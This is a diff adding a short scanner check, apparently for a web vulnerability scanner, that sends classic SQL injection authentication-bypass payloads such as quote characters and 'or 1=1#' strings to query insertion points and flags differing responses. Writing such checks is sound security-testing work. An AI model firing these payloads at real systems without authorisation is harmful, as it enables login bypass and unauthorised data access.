@@ -1,0 +1,23 @@
+metadata:
+    language: v2-beta
+    name: "Basic SQLi Checker"
+    description: "Bypass authentication SQLi"
+    author: "nu11secur1ty"
+
+run for each:
+    payloadSet =
+        "'",
+        "\"",
+        "nu11secur1ty' or 1=1#",
+        "#nu11secur1ty' or 1=1#"
+
+given query insertion point then
+    send payload called check:
+        appending: {payloadSet}
+
+    if {check} differs from {base} then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "We found SQLi bypass authentication Injection {payloads}"
+    end if
